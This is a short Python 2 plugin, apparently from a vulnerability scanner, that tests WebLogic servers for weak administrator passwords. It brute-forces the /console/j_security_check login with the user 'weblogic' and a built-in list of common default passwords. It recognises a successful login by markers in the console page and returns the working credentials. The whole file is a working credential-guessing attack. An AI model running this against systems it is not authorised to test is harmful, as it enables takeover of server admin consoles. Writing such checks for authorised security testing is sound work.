#coding:utf-8
import urllib2
from config import is_port_open, is_http


@is_port_open
def verify(host, port=80, name='', timeout=10):
    if is_http(host, int(port)) is False:
        return
    url = "http://%s:%d"%(host,int(port))
    info = {
        "url": url,
        'vuln_name': 'weblogic weak password',
        'severity': 'high',
        'proof': ""

    }
    error_i=0
    flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
    user_list=['weblogic']
    pass_list=['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    for user in user_list:
        for password in pass_list:
            try:
                PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                request = opener.open(url+'/console/j_security_check',PostStr,timeout=timeout)
                res_html = request.read()
            except urllib2.HTTPError,e:
                return
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info['proof'] = 'username={}&password={}'.format(user, password)
                    info['url'] = info['url'] + '/console/j_security_check'
                    # info = u'%s/console 账号：%s，密码：%s'%(url,user,password)
                    return info
